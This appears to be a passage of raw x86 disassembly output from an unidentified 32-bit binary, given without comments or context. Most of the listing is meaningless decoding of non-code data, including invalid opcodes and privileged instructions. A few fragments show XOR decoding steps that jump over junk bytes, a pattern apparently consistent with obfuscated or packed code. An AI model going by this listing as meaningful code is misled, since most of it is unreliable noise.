  405dcf:	xchg   ebp,eax
  405dd0:	dec    edi
  405dd1:	sub    al,BYTE PTR [ebx+0x62]
  405dd4:	(bad)  
  405dd5:	in     al,dx
  405dd6:	adc    esi,0xffffffd9
  405dd9:	dec    esp
  405dda:	mov    eax,ds:0xacbf0c8d
  405ddf:	in     eax,dx
  405de0:	jae    0x405dff
  405de2:	loope  0x405e2a
  405de4:	sub    eax,esp
  405de6:	jge    0x405d92
  405de8:	mov    al,0xc4
  405dea:	xor    DWORD PTR ds:0x375366c4,edx
  405df0:	sti    
  405df1:	retf   
  405df2:	mov    ecx,0xe203e88b
  405df7:	mov    ebp,0x95ec8db1
  405dfc:	cdq    
  405dfd:	sbb    dl,bh
  405dff:	xlat   BYTE PTR ds:[ebx]
  405e00:	xchg   esp,eax
  405e01:	stos   DWORD PTR es:[edi],eax
  405e02:	push   ebx
  405e03:	cs repnz aas 
  405e06:	and    DWORD PTR [esi],edi
  405e08:	out    0x4f,al
  405e0a:	cmp    DWORD PTR [ebx+0x25566801],0x56195843
  405e14:	fwait
  405e15:	sahf   
  405e16:	ss nop
  405e18:	arpl   sp,si
  405e1a:	mov    ecx,0xb03fd609
  405e1f:	sub    al,0xc4
  405e21:	push   cs
  405e22:	xor    al,ah
  405e24:	xlat   BYTE PTR ds:[ebx]
  405e25:	in     al,dx
  405e26:	jbe    0x405dad
  405e28:	(bad)  
  405e29:	out    dx,eax
  405e2a:	test   eax,0x1cc0ebda
  405e2f:	sbb    esp,DWORD PTR [edi+eiz*1-0x67]
  405e33:	ins    BYTE PTR es:[edi],dx
  405e34:	ss scas eax,DWORD PTR es:[edi]
  405e36:	sar    BYTE PTR [edx],0x3c
  405e39:	ja     0x405e03
  405e3b:	fdiv   DWORD PTR [ebx+0x56]
  405e3e:	out    0x36,eax
  405e40:	and    bh,dl
  405e42:	mov    eax,ds:0xa3eadd3c
  405e47:	add    ebx,DWORD PTR [esi-0x4d]
  405e4a:	test   DWORD PTR [eax],esi
  405e4c:	addr16 xchg ebp,eax
  405e4e:	(bad)  
  405e4f:	or     eax,0x848532b3
  405e54:	in     al,dx
  405e55:	ins    BYTE PTR es:[edi],dx
  405e56:	adc    al,0x6d
  405e58:	mov    ?,edi
  405e5a:	dec    esp
  405e5b:	jp     0x405ea6
  405e5d:	cmp    bl,dl
  405e5f:	jne    0x405e29
  405e61:	mov    ecx,0xcf1ccebc
  405e66:	mov    dl,0x95
  405e68:	scas   al,BYTE PTR es:[edi]
  405e69:	inc    edi
  405e6a:	mov    ds:0xca221f19,al
  405e6f:	push   esi
  405e70:	push   0x37
  405e72:	sub    al,0x62
  405e74:	pushf  
  405e75:	mov    al,0x21
  405e77:	mov    ch,0xbe
  405e79:	stos   BYTE PTR es:[edi],al
  405e7a:	(bad)  
  405e7b:	(bad)  
  405e7c:	sub    BYTE PTR [ebp+0x35],0x21
  405e80:	dec    DWORD PTR [edi+0x4e83de44]
  405e86:	push   0x7d
  405e88:	lods   eax,DWORD PTR ds:[esi]
  405e89:	in     eax,0xcc
  405e8b:	push   esi
  405e8c:	push   esi
  405e8d:	in     al,0xb6
  405e8f:	push   cs
  405e90:	lea    esp,[ecx-0x8]
  405e93:	aaa    
  405e94:	sbb    eax,eax
  405e96:	xlat   BYTE PTR ds:[ebx]
  405e97:	xchg   al,ch
  405e99:	jae    0x405e5d
  405e9b:	test   BYTE PTR [edx],dh
  405e9d:	pop    DWORD PTR [ebx+0x4504d41c]
  405ea3:	enter  0xa45,0x0
  405ea7:	stc    
  405ea8:	jg     0x405edc
  405eaa:	adc    ch,BYTE PTR [ebp-0x1071b9a0]
  405eb0:	sbb    al,0x12
  405eb2:	out    dx,eax
  405eb3:	mov    ecx,edi
  405eb5:	add    al,BYTE PTR [edx+0x22f3e42d]
  405ebb:	mov    ecx,0xb414aca1
  405ec0:	retf   
  405ec1:	pop    edx
  405ec2:	popa   
  405ec3:	int3   
  405ec4:	call   0x14df:0xd197bb14
  405ecb:	or     DWORD PTR [edi+0x76],esi
  405ece:	sahf   
  405ecf:	inc    ecx
  405ed0:	jb     0x405ee9
  405ed2:	mov    edi,0xcd6b9022
  405ed7:	add    ch,BYTE PTR [edx]
  405ed9:	cmp    al,0x18
  405edb:	and    al,0xda
  405edd:	pop    edi
  405ede:	adc    al,0x5b
  405ee0:	rcl    BYTE PTR [ecx],cl
  405ee2:	es push ebp
  405ee4:	cdq    
  405ee5:	outs   dx,BYTE PTR es:[esi]
  405ee7:	push   edi
  405ee8:	mov    DWORD PTR [ebx-0x1],ebp
  405eeb:	pop    edi
  405eec:	push   0xcdef1e12
  405ef1:	or     dh,BYTE PTR [bp+di+0x69]
  405ef5:	lods   eax,DWORD PTR ds:[esi]
  405ef6:	xchg   esp,eax
  405ef7:	in     al,dx
  405ef8:	int3   
  405ef9:	mov    ch,0x60
  405efb:	ins    BYTE PTR es:[edi],dx
  405efc:	fdivp  st(5),st
  405efe:	and    edi,ebx
  405f00:	hlt    
  405f01:	out    dx,eax
  405f02:	jnp    0x405efe
  405f04:	mov    ch,0xa0
  405f06:	or     ah,BYTE PTR ds:0x2a8b0623
  405f0c:	inc    eax
  405f0d:	dec    edi
  405f0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405f0f:	cmp    BYTE PTR [ebp-0x268297a2],0xde
  405f16:	ins    BYTE PTR es:[edi],dx
  405f17:	arpl   WORD PTR [edi+0x35ac7583],di
  405f1d:	mov    ds:0xc2a31e95,al
  405f22:	cmp    bl,BYTE PTR [esi+0x12b6d8fd]
  405f28:	ins    DWORD PTR es:[edi],dx
  405f29:	mov    ah,BYTE PTR [edi-0x7336c0cd]
  405f2f:	ins    DWORD PTR es:[edi],dx
  405f30:	pop    esi
  405f31:	sbb    edx,eax
  405f33:	adc    ebp,DWORD PTR [edx+0x37f56e70]
  405f39:	jge    0x405ecc
  405f3b:	cmp    BYTE PTR [edi+eiz*8+0x14],0xd3
  405f40:	push   ds
  405f41:	and    esi,ebx
  405f43:	mov    cl,0xe
  405f45:	(bad)  
  405f46:	out    dx,al
  405f47:	adc    eax,0xcce01afa
  405f4c:	sbb    eax,0x9158243c
  405f51:	dec    ebp
  405f52:	aaa    
  405f53:	ds test al,0xaa
  405f56:	cs xchg ecx,eax
  405f58:	adc    BYTE PTR [edi+ebp*2+0x2b],bl
  405f5c:	loope  0x405f45
  405f5e:	outs   dx,DWORD PTR ds:[esi]
  405f5f:	pop    ecx
  405f60:	retf   
  405f61:	mov    ecx,DWORD PTR [ebx-0x6ccee2af]
  405f67:	arpl   WORD PTR [edi-0x56],cx
  405f6a:	enter  0x8a5,0x16
  405f6e:	or     al,bh
  405f70:	ror    BYTE PTR [esi-0x6f654e0e],0x49
  405f77:	pop    esp
  405f78:	and    al,0x8a
  405f7a:	loope  0x405fb2
  405f7c:	dec    ecx
  405f7d:	jb     0x405f63
  405f7f:	mov    cl,0xc5
  405f81:	int3   
  405f82:	jno    0x405f4a
  405f84:	int    0x62
  405f86:	cli    
  405f87:	mov    bl,BYTE PTR [esi]
  405f89:	and    ah,BYTE PTR [ecx]
  405f8b:	pop    eax
  405f8c:	outs   dx,BYTE PTR ds:[esi]
  405f8d:	jo     0x405f42
  405f8f:	jmp    0x5b5cc532
  405f94:	inc    ebx
  405f95:	sbb    eax,0x2075f7e3
  405f9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405f9b:	ja     0x405fdc
  405f9d:	pop    ecx
  405f9e:	icebp  
  405f9f:	inc    edx
  405fa0:	imul   edx,DWORD PTR [edx],0x3f
  405fa3:	rcr    BYTE PTR [edx+0x2136ae41],cl
  405fa9:	jle    0x405f74
  405fab:	mov    bl,0x58
  405fad:	daa    
  405fae:	lods   al,BYTE PTR ds:[esi]
  405faf:	fsubr  QWORD PTR [ebx-0x6a871bc6]
  405fb5:	sbb    al,0x1c
  405fb7:	mov    ch,BYTE PTR [edx+edi*4]
  405fba:	xchg   edi,eax
  405fbb:	xchg   esi,eax
  405fbc:	xchg   edi,eax
  405fbd:	and    dh,BYTE PTR [ebx+0x4a]
  405fc0:	setne  BYTE PTR [ebx+0x22]
  405fc4:	jns    0x405ffa
  405fc6:	js     0x405f52
  405fc8:	scas   al,BYTE PTR es:[edi]
  405fc9:	ror    BYTE PTR [esi+0x51751cf8],cl
  405fcf:	pop    eax
  405fd0:	call   ebp
  405fd2:	pop    ss
  405fd3:	idiv   BYTE PTR [edx]
  405fd5:	out    dx,eax
  405fd6:	pop    esi
  405fd7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405fd8:	out    0xc9,al
  405fda:	out    0xa5,al
  405fdc:	out    dx,eax
  405fdd:	pop    ds
  405fde:	xchg   edx,eax
  405fdf:	les    ebx,FWORD PTR [eax+ebp*2+0x751ebacb]
  405fe6:	or     dh,BYTE PTR [esi-0x3d0f3c71]
  405fec:	adc    DWORD PTR [edi+0x477e7b7b],0xffffff9d
  405ff3:	into   
  405ff4:	enter  0x5eaf,0x52
  405ff8:	dec    esi
  405ff9:	jmp    0xff330f0a
  405ffe:	sub    DWORD PTR [eax],0xfffffff3
  406001:	xor    esi,DWORD PTR ds:0x6ae943e7
  406007:	push   ebx
  406008:	je     0x405f8d
  40600a:	(bad)  
  40600b:	push   ss
  40600c:	jbe    0x405fe7
  40600e:	in     eax,dx
  40600f:	repnz popa 
  406011:	leave  
  406012:	je     0x405faf
  406014:	cmp    al,0x38
  406016:	push   es
  406017:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406018:	call   0x6b09:0xb7e22a49
  40601f:	fnstcw WORD PTR [eax]
  406021:	(bad)
  406025:	sar    DWORD PTR [ebx],cl
  406027:	jno    0x405fb9
  406029:	xchg   ecx,eax
  40602a:	sub    BYTE PTR [edx+0x17],0xb7
  40602e:	ins    DWORD PTR es:[edi],dx
  40602f:	sbb    al,0x24
  406031:	xor    eax,0xeb3be370
  406036:	push   es
  406037:	fiadd  DWORD PTR [esp+eax*1-0x78cf959b]
  40603e:	mov    bh,0x7b
  406040:	sub    ch,dl
  406042:	cmc    
  406043:	push   edi
  406044:	pusha  
  406045:	ja     0x4060a9
  406047:	jne    0x406040
  406049:	pop    esi
  40604a:	pushf  
  40604b:	rcr    DWORD PTR [esi+eiz*1],cl
  40604e:	loope  0x406023
  406050:	sub    al,dl
  406052:	add    dl,dl
  406054:	sub    BYTE PTR [ecx+ebx*2],ah
  406057:	pop    eax
  406058:	ficom  WORD PTR [ecx+0x28735bdd]
  40605e:	dec    ax
  406060:	xchg   BYTE PTR [edi+0x38e731c3],ch
  406066:	imul   eax,esp,0x5c27caa7
  40606c:	stc    
  40606d:	adc    ah,cl
  40606f:	sub    eax,0x4d3c1607
  406074:	push   esp
  406075:	inc    eax
  406076:	mov    cl,0xd0
  406078:	js     0x4060c9
  40607a:	pop    ecx
  40607b:	mov    edi,DWORD PTR [ebx-0x5a7ffbff]
  406081:	inc    edx
  406082:	add    eax,DWORD PTR [ebx-0x1d31a643]
  406088:	retf   0x6045
  40608b:	adc    eax,0xe70050cf
  406090:	fst    DWORD PTR [esi+ebp*2-0x4c]
  406094:	sbb    eax,0x816a3f05
  406099:	jg     0x406031
  40609b:	ja     0x40609d
  40609d:	(bad)  
  40609f:	outs   dx,BYTE PTR ds:[esi]
  4060a0:	retf   0x8950
  4060a3:	div    BYTE PTR [eax]
  4060a5:	pop    eax
  4060a6:	jae    0x4060ef
  4060a8:	ret    0xe81d
  4060ab:	push   edx
  4060ac:	xchg   edx,eax
  4060ad:	or     DWORD PTR [ebp+0x4e],esi
  4060b0:	mov    dl,0x76
  4060b2:	ret    
  4060b3:	sbb    DWORD PTR [edi],esi
  4060b5:	mov    esi,0xfacb1868
  4060ba:	jmp    0x4060fc
  4060bc:	mov    cl,0x73
  4060be:	stc    
  4060bf:	jns    0x406100
  4060c1:	dec    esi
  4060c2:	adc    esi,DWORD PTR [eax+0x6f]
  4060c5:	mov    ecx,DWORD PTR [ecx-0x76ac97a9]
  4060cb:	wbinvd 
  4060cd:	mov    BYTE PTR [eax+0x33],bh
  4060d0:	pop    ebx
  4060d1:	inc    esp
  4060d2:	shl    DWORD PTR ds:0x12984935,cl
  4060d8:	push   0x410d21da
  4060dd:	repz dec esi
  4060df:	and    esp,ebp
  4060e1:	fidiv  WORD PTR [edx]
  4060e3:	adc    al,0x68
  4060e5:	pop    edi
  4060e6:	(bad)
  4060e9:	lock lds ebp,FWORD PTR [ebp+0x78a012fe]
  4060f0:	or     eax,0xaaf830e3
  4060f5:	xor    edi,DWORD PTR [edx-0x3fabb73]
  4060fb:	mov    DWORD PTR [ebp-0x34],eax
  4060fe:	mov    eax,DWORD PTR [ebp-0x30]
  406101:	mov    ecx,DWORD PTR [ebp-0x2c]
  406104:	shrd   eax,ecx,0x2
  406108:	shr    ecx,0x2
  40610b:	mov    ecx,DWORD PTR [ebp-0x30]
  40610e:	mov    edx,DWORD PTR [ebp-0x2c]
  406111:	shl    ecx,0x1e
  406114:	mov    ecx,DWORD PTR [ebp-0x14]
  406117:	xor    eax,edi
  406119:	xor    edx,edx
  40611b:	jmp    0x4064f9
  406120:	sar    DWORD PTR [ebx+0x5b],cl
  406123:	mov    ecx,0x5b3bb91b
  406128:	lds    eax,FWORD PTR [ebx+0x27]
  40612b:	stos   BYTE PTR es:[edi],al
  40612c:	adc    eax,0x78bc6507
  406131:	mov    ds:0x129e1818,eax
  406136:	sbb    BYTE PTR [eax],bl
  406138:	shr    BYTE PTR [eax+0x2256df41],1
  40613e:	sub    al,0x5a
  406140:	cmp    eax,0x29c99070
  406145:	neg    DWORD PTR [edi+0x196a3774]
  40614b:	dec    esp
  40614c:	sub    esi,ecx
  40614e:	icebp  
  40614f:	or     al,BYTE PTR [ebp-0x16]
  406152:	enter  0x6b45,0xe4
  406156:	push   0xffffff8c
  406158:	retf   
  406159:	fs in  al,0x89
  40615c:	(bad)  
  40615d:	mov    edi,0x9d365e19
  406162:	adc    eax,0x1069e6ab
  406167:	scas   eax,DWORD PTR es:[edi]
  406168:	(bad)  
  406169:	push   0x6c
  40616b:	xchg   esp,eax
  40616c:	cli    
  40616d:	(bad)  
  40616e:	ds dec esp
  406170:	add    eax,0x4a1bd304
  406175:	cmp    esp,DWORD PTR [edi]
  406177:	mov    bl,BYTE PTR ds:0xb4074dc7
  40617d:	sbb    BYTE PTR [ebp-0x8],bl
  406180:	mul    BYTE PTR [eax-0x23be3e47]
  406186:	outs   dx,DWORD PTR ds:[esi]
  406187:	mov    dh,cl
  406189:	adc    dh,BYTE PTR [ebp-0x47]
  40618c:	mov    bl,0x79
  40618e:	mov    ds:0x6afd7887,al
  406193:	ins    BYTE PTR es:[edi],dx
  406194:	cmp    ecx,DWORD PTR [eax-0x9]
  406197:	call   0x4d72:0x45ee0af4
  40619e:	add    ebx,DWORD PTR [esi+0x5537b569]
  4061a4:	ins    BYTE PTR es:[edi],dx
  4061a5:	inc    BYTE PTR [ebx-0x4e89cb5a]
  4061ab:	arpl   WORD PTR [ecx-0x44],si
  4061ae:	out    dx,eax
  4061af:	sub    DWORD PTR [edx],0x7a
  4061b2:	xchg   dh,dh
  4061b4:	cmp    dl,0x36
  4061b7:	mov    ds:0x70b1b5b2,eax
  4061bc:	inc    esp
  4061bd:	repnz xchg esi,eax
  4061bf:	shl    DWORD PTR [ebx],0x7b
  4061c2:	fucomp st(5)
  4061c4:	xchg   ebp,eax
  4061c5:	icebp  
  4061c6:	jnp    0x4061c5
  4061c8:	xlat   BYTE PTR ds:[ebx]
  4061c9:	pop    edi
  4061ca:	lods   al,BYTE PTR ds:[esi]
  4061cb:	stc    
  4061cc:	cli    
  4061cd:	fidivr DWORD PTR [edi]
  4061cf:	sti    
  4061d0:	pop    ds
  4061d1:	add    al,0x13
  4061d3:	or     ecx,DWORD PTR ds:0xf99b51c5
  4061d9:	adc    edx,DWORD PTR [ecx+0x77d6bf71]
  4061df:	mov    ebp,0x14d9c37a
  4061e4:	fwait
  4061e5:	(bad)  
  4061e6:	out    0xd,al
  4061e8:	xchg   edx,eax
  4061e9:	in     eax,0xab
  4061eb:	loop   0x40620d
  4061ed:	jno    0x40617c
  4061ef:	call   0xc0d:0x9a23c12b
  4061f6:	cmp    edx,eax
  4061f8:	std    
  4061f9:	cmp    BYTE PTR [eax-0x48],bl
  4061fc:	mov    dl,BYTE PTR [esi-0x67]
  4061ff:	pop    ebp
  406200:	fisttp WORD PTR [eax+0x19]
  406203:	pop    ss
  406204:	pop    edi
  406205:	push   edx
  406206:	xchg   DWORD PTR [ebp-0x75],edx
  406209:	mov    edi,0xb468d9f6
  40620e:	loope  0x4061e6
  406210:	sub    al,0x8f
  406212:	ins    DWORD PTR es:[edi],dx
  406213:	mov    DWORD PTR [eax+0x162ca948],esi
  406219:	inc    ebx
  40621a:	add    eax,0x21c5997e
  40621f:	hlt    
  406220:	enter  0x6402,0xd0
  406224:	popa   
  406225:	daa    
  406226:	loope  0x4061ef
  406228:	adc    BYTE PTR [ecx+0x3b],cl
  40622b:	mov    ds:0x25b6bf56,al
  406230:	xor    al,0xc2
  406232:	mov    BYTE PTR [esi-0x6c6fe8db],bh
  406238:	inc    esp
  406239:	xor    al,0xb0
  40623b:	loopne 0x406280
  40623d:	shr    BYTE PTR [ecx-0x247ff9ae],1
  406243:	pop    esi
  406244:	add    al,bh
  406246:	ins    BYTE PTR es:[edi],dx
  406247:	inc    ebx
  406248:	gs aam 0x65
  40624b:	mov    ah,0xf3
  40624d:	or     edx,esp
  40624f:	leave  
  406250:	scas   al,BYTE PTR es:[edi]
  406251:	ret    0x498
  406254:	pop    ebp
  406255:	pop    ecx
  406256:	inc    esp
  406257:	in     al,0xe0
  406259:	jp     0x406295
  40625b:	into   
  40625c:	in     al,dx
  40625d:	ficom  WORD PTR [edi+0x13]
  406260:	fs sub eax,0x1cb872db
  406266:	sbb    edx,0x1fffc3e7
  40626c:	push   ds
  40626d:	lahf   
  40626e:	xlat   BYTE PTR ds:[ebx]
  40626f:	imul   esi,DWORD PTR [ebx+0x6e534476],0x41
  406276:	mov    dh,0x96
  406278:	retf   
  406279:	arpl   WORD PTR [edi+ecx*8-0x22],ax
  40627d:	nop
  40627e:	and    al,0x3e
  406280:	inc    edi
  406281:	mov    dl,BYTE PTR [ebp-0x4ca03bad]
  406287:	bound  ecx,QWORD PTR [esi-0x66860cd6]
  40628d:	jbe    0x406242
  40628f:	xor    edi,ebx
  406291:	push   eax
  406292:	xor    BYTE PTR [edi-0x44],dh
  406295:	ins    BYTE PTR es:[edi],dx
  406296:	mov    cl,0xc1
  406298:	jbe    0x40621e
  40629a:	jg     0x4062d6
  40629c:	fisttp QWORD PTR [esi]
  40629e:	xlat   BYTE PTR ds:[ebx]
  40629f:	retf   0xd181
  4062a2:	cmp    edx,DWORD PTR [eax+ebp*2-0x548d8e44]
  4062a9:	push   ss
  4062aa:	fs and eax,0x3edc1d50
  4062b0:	mov    ecx,DWORD PTR [ecx+ebp*1-0x1de5b694]
  4062b7:	mov    esp,0x2a693840
  4062bc:	fwait
  4062bd:	std    
  4062be:	(bad)  
  4062bf:	popf   
  4062c0:	sbb    ebp,DWORD PTR [eax]
  4062c2:	mov    cl,dl
  4062c4:	sbb    esi,DWORD PTR [ebp+esi*1+0x19]
  4062c8:	idiv   DWORD PTR [ecx-0x22]
  4062cb:	xchg   edx,eax
  4062cc:	xor    al,0x8e
  4062ce:	inc    eax
  4062cf:	inc    esi
  4062d0:	add    esi,DWORD PTR [ebp-0x6d2e7034]
  4062d6:	test   ah,bh
  4062d8:	ja     0x406317
  4062da:	push   0x14
  4062dc:	dec    ebx
  4062dd:	dec    esi
  4062de:	ss imul ebp,ecx,0xffffffd7
  4062e2:	mov    ebp,0xf8f69966
  4062e7:	les    ecx,FWORD PTR [ebx+eiz*8-0x25]
  4062eb:	jmp    0xc49dea45
  4062f0:	xadd   BYTE PTR [eax+0x6c],bh
  4062f4:	fadd   QWORD PTR [ecx+0x45]
  4062f7:	sbb    edx,DWORD PTR [edi+0x5e]
  4062fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4062fb:	xchg   edi,eax
  4062fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4062fd:	retf   0x67cd
  406300:	xor    BYTE PTR [esi+0x26],dh
  406303:	add    DWORD PTR [ecx],ebp
  406305:	dec    esi
  406306:	je     0x40636c
  406308:	xchg   ebp,eax
  406309:	dec    bh
  40630b:	pop    eax
  40630c:	sar    cl,cl
  40630e:	pop    ebp
  40630f:	and    BYTE PTR [ecx],bl
  406311:	mov    ecx,0xa6fc15a4
  406316:	cmp    bh,dh
  406318:	clc    
  406319:	push   edi
  40631a:	mov    bl,0xf9
  40631c:	ss push es
  40631e:	xchg   ebx,eax
  40631f:	ret    0xc0be
  406322:	aaa    
  406323:	mov    eax,0x718ed0c2
  406328:	mov    esi,0xbc1140aa
  40632d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40632e:	mov    edx,0xf0c0105b
  406333:	pop    esi
  406334:	jecxz  0x40637f
  406336:	outs   dx,BYTE PTR ds:[esi]
  406337:	and    eax,0x1643b817
  40633c:	aad    0xfb
  40633e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40633f:	gs jle 0x406361
  406342:	pop    esp
  406343:	stc    
  406344:	mov    ch,0x72
  406346:	mov    bl,0x6a
  406348:	rol    BYTE PTR [ebx],0xa8
  40634b:	sahf   
  40634c:	inc    edx
  40634d:	adc    DWORD PTR [edi+edi*4],edi
  406350:	fadd   QWORD PTR [edi]
  406352:	std    
  406353:	or     BYTE PTR [esi+0x78],0xf2
  406357:	push   ecx
  406358:	imul   eax,DWORD PTR [edi],0x5f1e6d47
  40635e:	push   edx
  40635f:	mov    BYTE PTR [ebx-0x22adf531],cl
  406365:	mov    esp,0xeeabaa18
  40636a:	mov    esp,0x470b35c
  40636f:	push   esp
  406370:	ins    DWORD PTR es:[edi],dx
  406371:	mov    ds:0x896166cd,eax
  406376:	pminsw mm6,QWORD PTR [ecx]
  406379:	add    eax,0xbe2f0f81
  40637e:	fidivr DWORD PTR [eax-0x428ab1d]
  406384:	gs dec edi
  406386:	and    edi,DWORD PTR [edi-0x58]
  406389:	pop    edi
  40638a:	mov    ch,BYTE PTR [ebp+0x3]
  40638d:	retf   0x83c9
  406390:	stc    
  406391:	sar    BYTE PTR [edi+0x0],0x63
  406395:	hlt    
  406396:	jecxz  0x406409
  406398:	inc    esi
  406399:	aam    0xdb
  40639b:	repz sub ebp,ebx
  40639e:	aaa    
  40639f:	es inc ebx
  4063a1:	cli    
  4063a2:	(bad)  
  4063a3:	repz mov ebp,0x1c08388d
  4063a9:	icebp  
  4063aa:	arpl   WORD PTR [esi],cx
  4063ac:	bound  edx,QWORD PTR [ebx]
  4063ae:	or     al,BYTE PTR es:0x4c0418eb
  4063b5:	stos   BYTE PTR es:[edi],al
  4063b6:	out    dx,eax
  4063b7:	adc    esp,DWORD PTR [eax-0x9]
  4063ba:	cdq    
  4063bb:	in     al,dx
  4063bc:	jne    0x406383
  4063be:	push   eax
  4063bf:	xchg   edx,eax
  4063c0:	daa    
  4063c1:	jb     0x406346
  4063c3:	(bad)  
  4063c4:	mov    edx,0x7559defe
  4063c9:	mov    ds,WORD PTR [edx-0x13]
  4063cc:	cli    
  4063cd:	add    edi,DWORD PTR [ecx-0x12aaa3e6]
  4063d3:	and    cl,BYTE PTR [ebx-0xc]
  4063d6:	or     cl,dh
  4063d8:	lods   al,BYTE PTR ds:[esi]
  4063d9:	out    0x61,al
  4063db:	pusha  
  4063dc:	sub    DWORD PTR ss:[edi-0x7f],esi
  4063e0:	mov    ebx,cr2
  4063e3:	lahf   
  4063e4:	outs   dx,DWORD PTR ds:[esi]
  4063e5:	adc    bl,BYTE PTR [edi+0x56]
  4063e8:	(bad)  
  4063e9:	fst    QWORD PTR [edx+0x3b]
  4063ec:	mov    ecx,DWORD PTR [eax-0x5863a341]
  4063f2:	pop    eax
  4063f3:	leave  
  4063f4:	pushf  
  4063f5:	xchg   edx,eax
  4063f6:	or     DWORD PTR [ebp+eax*4+0x5f],ebp
  4063fa:	(bad)  
  4063fb:	loope  0x406452
  4063fd:	and    cl,ch
  4063ff:	aam    0x31
  406401:	push   edx
  406402:	imul   eax,DWORD PTR [esi-0x759a780e],0x2690d261
  40640c:	inc    edx
  40640d:	jg     0x40641c
  40640f:	iret   
  406410:	dec    eax
  406411:	jle    0x4063e6
  406413:	gs jmp 0x961f7c21
  406419:	jnp    0x40646a
  40641b:	jp     0x406409
  40641d:	int3   
  40641e:	jo     0x4063c8
  406420:	push   esp
  406421:	imul   edi,DWORD PTR [ebp-0x19],0x94e75169
  406428:	cmp    al,0xe
  40642a:	fistp  QWORD PTR [edx+0x59]
  40642d:	icebp  
  40642e:	dec    esp
  40642f:	retf   0x8f9c
  406432:	cld    
  406433:	cmp    ah,bh
  406435:	pop    edi
  406436:	add    cl,al
  406438:	mov    ebx,0x3e6e7dc
  40643d:	inc    eax
  40643e:	jge    0x4063c7
  406440:	cmp    DWORD PTR [ebp-0x78f9d856],0x76
  406447:	push   esp
  406448:	push   eax
  406449:	mov    dh,0xc9
  40644b:	push   ss
  40644c:	push   cs
  40644d:	sbb    al,0x60
  40644f:	pushf  
  406450:	mov    WORD PTR [ecx],?
  406452:	xchg   edi,ebx
  406454:	lock arpl WORD PTR [esi-0x59],di
  406458:	cdq    
  406459:	push   esp
  40645a:	sub    BYTE PTR [edx+edx*1],bh
  40645d:	(bad)  
  40645f:	lods   eax,DWORD PTR ds:[esi]
  406460:	xor    ah,BYTE PTR [ecx+eiz*8+0x1716046c]
  406467:	push   ss
  406468:	adc    eax,0x9f203483
  40646d:	pop    ds
  40646e:	inc    ecx
  40646f:	xchg   esp,eax
  406470:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406471:	cmp    BYTE PTR [esi-0xcc4d9fb],bh
  406477:	test   BYTE PTR [esi-0x5a],bl
  40647a:	xchg   ebx,eax
  40647b:	xor    BYTE PTR [esi-0x44a96af0],0xd5
  406482:	std    
  406483:	fsubr  DWORD PTR [ebp-0x36]
  406486:	fs jns 0x40649b
  406489:	push   esi
  40648a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40648b:	push   esi
  40648c:	push   ds
  40648d:	mov    eax,ds:0x2762a24e
  406492:	xor    ch,0xfe
  406495:	mov    ebx,0x40dfc996
  40649a:	dec    ecx
  40649b:	data16 fs mov bh,0xdc
  40649f:	inc    ecx
  4064a0:	shr    DWORD PTR [ebx],0x4a
  4064a3:	mul    DWORD PTR [ecx-0x4faf1c7]
  4064a9:	dec    eax
  4064aa:	repz cmp edx,eax
  4064ad:	pop    eax
  4064ae:	mov    bl,ch
  4064b0:	js     0x406472
  4064b2:	rcl    BYTE PTR [ecx-0x61289a18],cl
  4064b8:	icebp  
  4064b9:	popa   
  4064ba:	mov    ebx,gs
  4064bc:	jp     0x40651a
  4064be:	push   ss
  4064bf:	jle    0x4064c2
  4064c1:	loope  0x4064bf
  4064c3:	jo     0x4064c1
  4064c5:	pop    eax
  4064c6:	and    DWORD PTR [ebp-0x861ae1a],esi
  4064cc:	xchg   esi,eax
  4064cd:	cld    
  4064ce:	ds loope 0x40652a
  4064d1:	aas    
  4064d2:	sub    dh,BYTE PTR [esi+0x2b]
  4064d5:	not    DWORD PTR [ebp-0x5dfe15c2]
  4064db:	xchg   esi,eax
  4064dc:	sub    BYTE PTR [ecx-0x7f],ch
  4064df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4064e0:	and    eax,DWORD PTR [edi+ebx*1-0x3a3e8e1e]
  4064e7:	jno    0x406526
  4064e9:	enter  0x4a45,0x5e
  4064ed:	repz inc eax
  4064ef:	push   ss
  4064f0:	add    eax,0x8d01a348
  4064f5:	out    0x9a,al
  4064f7:	fisubr DWORD PTR [ebx]
  4064f9:	or     eax,edx
  4064fb:	mov    cl,BYTE PTR [eax+ecx*1]
  4064fe:	mov    eax,DWORD PTR [ebp-0x34]
  406501:	xor    BYTE PTR [eax],cl
  406503:	mov    eax,DWORD PTR [ebp-0x20]
  406506:	mov    ecx,DWORD PTR [ebp-0x1c]
  406509:	shrd   eax,ecx,0x2
  40650d:	shr    ecx,0x2
  406510:	mov    ecx,DWORD PTR [ebp-0x20]
  406513:	mov    edx,DWORD PTR [ebp-0x1c]
  406516:	xor    eax,edi
  406518:	shl    ecx,0x1e
  40651b:	xor    edx,edx
  40651d:	or     eax,edx
  40651f:	lea    eax,[ebp+eax*1-0x4]
  406523:	mov    DWORD PTR [ebp-0x34],eax
  406526:	mov    eax,DWORD PTR [ebp-0x20]
  406529:	mov    ecx,DWORD PTR [ebp-0x1c]
  40652c:	shrd   eax,ecx,0x2
  406530:	shr    ecx,0x2
  406533:	mov    ecx,DWORD PTR [ebp-0x20]
  406536:	mov    edx,DWORD PTR [ebp-0x1c]
  406539:	jmp    0x406917
  40653e:	push   es
  40653f:	sbb    ebx,DWORD PTR ds:0xc65a1d5c
  406545:	sbb    dl,BYTE PTR [edx]
  406547:	aas    
  406548:	xor    DWORD PTR [esi-0x4f803b0b],edi
  40654e:	call   FWORD PTR [ebx+0x129e1818]
  406554:	sbb    BYTE PTR [eax],bl
  406556:	push   eax
  406557:	mov    cl,0xb9
  406559:	das    
  40655a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40655b:	adc    eax,0x2f4bedba
  406560:	mov    al,0x80
  406562:	inc    eax
  406563:	and    eax,0xab43592b
  406568:	repz xor eax,0xdc9cd18
  40656e:	(bad)  
  40656f:	xor    al,0x45
  406571:	aas    
  406572:	imul   ebx,esp,0x23b42f9a
